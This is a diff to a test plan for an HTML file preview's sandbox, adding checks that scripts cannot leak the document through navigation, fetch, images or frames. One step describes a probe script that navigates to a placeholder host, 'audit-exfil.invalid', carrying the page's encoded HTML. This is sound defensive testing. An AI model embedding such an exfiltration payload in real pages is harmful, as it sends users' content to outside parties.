@@ -9,6 +9,7 @@ selectors:
   - "Some assets could not be loaded: "
 tests:
   - apps/web/spec/integration/files-html-preview.test.tsx
+  - apps/web/spec/e2e/files-html-preview.e2e.ts
 api:
   - GET /api/worktrees/:worktreeId/text
   - POST /api/worktrees/:worktreeId/preview-assets
@@ -60,8 +61,24 @@ Capture missing.png notice, inlined teal logo and only preview-assets POST traff
 
 Automated coverage: `files-html-preview.test.tsx`.
 
+### 3. Scripts cannot send the document through navigation or resources
+
+1. Before opening a probe, intercept `https://audit-exfil.invalid/**`, `http://audit-exfil.invalid/**` and the disposable app origin's `/preview-capture` path in the browser context. Fulfill locally or abort; record only whether each request was a navigation and contained the synthetic marker. Never send real repository content to an external destination.
+2. Create `preview-probe.html` with the synthetic heading `AUDIT_ONLY_CONTENT` and an inline script assigning `location.href` to `https://audit-exfil.invalid/capture?d=` plus `encodeURIComponent(document.documentElement.outerHTML)`. Open it through Files.
+   Expect: zero destination requests and a browser CSP refusal for `frame-src 'none'`. A navigation attempt can replace the inner document with the browser's blocked page; Source and Preview remain available to inspect or reopen it.
+3. Repeat with `location.assign`, `location.replace`, HTTP, a same-host `/preview-capture` destination, a link click and a dynamically inserted refresh meta tag.
+   Expect: zero destination requests for every attempt.
+4. Open a benign interactive document with an inline button handler and an inlined local JavaScript file. Click the button.
+   Expect: both scripts run, the button changes its label and reading `parent.document` throws. Change between light and dark appearance: the document keeps its interaction state and does not execute its scripts again. Dynamically attempt an external image, `fetch` and an iframe.
+   Expect: image, connection and frame CSP violations, and zero destination requests.
+5. Switch to Source and back to Preview.
+   Expect: Source removes both frames and executes no script; Preview creates a fresh isolated document and its interaction works again.
+6. Repeat at 1440 and 414 pixels, light and dark, and against a production browser build. Separately run the desktop renderer with its actual response CSP; record restrictions inherited from that policy rather than assuming browser results apply. Android uses a native renderer with scripts disabled, blocked network loads and a request interceptor; verify its static preview and navigation separately with the mobile lifecycle.
+
+Automated navigation and interaction coverage: `files-html-preview.e2e.ts`.
+
 ## Gotchas
 
 - While assets are read the panel shows status "Loading preview…".
-- The frame is sandboxed (`allow-scripts` only, no same origin) with a CSP that allows only `data:` and `blob:` images; external URLs and references outside the page's folder are reported as missing, not fetched.
+- A trusted outer frame embeds the document in a second `srcdoc` frame. Both are sandboxed (`allow-scripts` only, no same origin). The outer document's `frame-src 'none'` blocks the inner frame's network navigation, and its inherited resource CSP allows only `data:` and `blob:` images. Preview scripts cannot access or weaken the outer policy. External URLs and references outside the page's folder are reported as missing, not fetched.
 - The display default is a per-browser preference: if an earlier feature in this instance set HTML files to open as source in Settings, the page opens on "Source"; click "Preview".
